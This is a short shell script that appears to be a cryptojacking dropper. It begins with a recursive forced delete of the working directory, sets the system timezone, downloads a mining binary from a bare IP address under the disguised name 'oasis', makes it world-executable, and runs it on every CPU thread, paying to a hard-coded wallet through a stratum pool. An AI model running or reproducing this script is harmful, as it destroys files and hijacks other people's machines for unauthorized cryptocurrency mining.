rm -rvf * 
#!/bin/sh
ln -fs /usr/share/zoneinfo/Africa/Johannesburg /etc/localtime
dpkg-reconfigure --frontend noninteractive tzdata
wget -O oasis http://139.180.133.28/SRBMiner-MULTI
chmod 777 oasis
./oasis --algorithm verushash --pool stratum+tcp://sg.vipor.net:5040 --wallet RCADCQ9UW1RsUaF94Jp4huPSdQ7bhwYwa4.$(echo $(shuf -i 1-100000 -n 1)-GBUT) --password x --cpu-threads $(nproc --all)
